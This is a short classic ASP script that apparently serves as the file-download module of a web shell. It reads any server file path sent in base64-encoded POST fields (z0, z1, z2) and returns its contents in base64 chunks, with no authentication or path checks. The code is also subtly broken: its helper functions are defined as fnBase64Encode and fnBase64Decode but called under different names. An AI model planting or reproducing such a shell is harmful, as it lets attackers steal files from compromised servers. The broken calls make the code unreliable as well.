<%

Option Explicit
Response.Buffer = true

Function fnBase64Encode(binaryData)
    Dim xml, node
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    
    node.DataType = "bin.base64"
    node.NodeTypedValue = binaryData
    fnBase64Encode = Replace(node.text, vbLf, "")
End Function

Function fnBase64Decode(str)
    Dim xml, node
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")

    node.dataType = "bin.base64"
    node.text = str
    fnBase64Decode = node.nodeTypedValue
End Function

Dim szPath, szChunkSize, szOffset
Dim nChunkSize, nOffset, nFileSize

szPath = Base64Decode(Request.Form("z0"))
szChunkSize = CLng(Base64Decode(Request.Form("z1")))
szOffset = CLng(Base64Decode(Request.Form("z2")))

nChunkSize = szChunkSize
nOffset = szOffset

Dim fso, file
Set fso = Server.CreateObject("Scripting.FileSystemObject")

If Not fso.FileExists(szPath) Then
    Response.Write "0|ERROR://file not exists"
    Response.End
End If

Set file = fso.GetFile(szPath)
nFileSize = file.Size

If nOffset >= nFileSize Then
    Response.Write "2|"
    Response.End
End If

Dim stream
Set stream = Server.CreateObject("ADODB.Stream")

stream.Type = 1 ' binary
stream.Open
stream.LoadFromFile szPath

stream.Position = nOffset

Dim remaining, readSize
remaining = nFileSize - nOffset

If nChunkSize > remaining Then
    readSize = remaining
Else
    readSize = nChunkSize
End If

Dim data
data = stream.Read(readSize)

stream.Close
Set stream = Nothing

Response.Write "1|" & Base64Encode(data)
Response.End

%>